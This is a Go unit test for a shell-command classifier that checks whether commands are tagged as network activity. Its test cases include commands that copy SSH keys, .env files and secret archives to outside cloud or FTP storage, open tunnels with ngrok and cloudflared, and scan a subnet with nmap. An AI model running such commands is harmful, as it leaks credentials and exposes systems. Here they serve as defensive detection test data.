package classify

import "testing"

func TestMoreNetworkTools(t *testing.T) {
	for cmd, want := range map[string]string{
		"rclone copy ~/.ssh remote:backup":                        ClassNetwork,
		"s3cmd put secrets.tar s3://bucket/":                      ClassNetwork,
		"gsutil cp .env gs://bucket/":                             ClassNetwork,
		"azcopy copy ./data https://acct.blob.core.windows.net/c": ClassNetwork,
		"ngrok http 8080":                                         ClassNetwork,
		"cloudflared tunnel --url http://localhost:8080":          ClassNetwork,
		"lftp -e 'put .env' ftp://x.test":                         ClassNetwork,
		"xh POST https://x.test/upload":                           ClassNetwork,
		"websocat wss://x.test/socket":                            ClassNetwork,
		"grpcurl -d @ x.test:443 svc/Method":                      ClassNetwork,
		"nmap -p 22 10.0.0.0/24":                                  ClassNetwork,
		"openssl s_client -connect x.test:443":                    ClassNetwork,
		"sudo -u root rclone sync . remote:":                      ClassNetwork,

		"openssl rand -hex 16":            ClassOther,
		"openssl x509 -in cert.pem -text": ClassOther,
	} {
		if _, got := Bash(cmd); got != want {
			t.Errorf("Bash(%q) = %s, want %s", cmd, got, want)
		}
	}
}
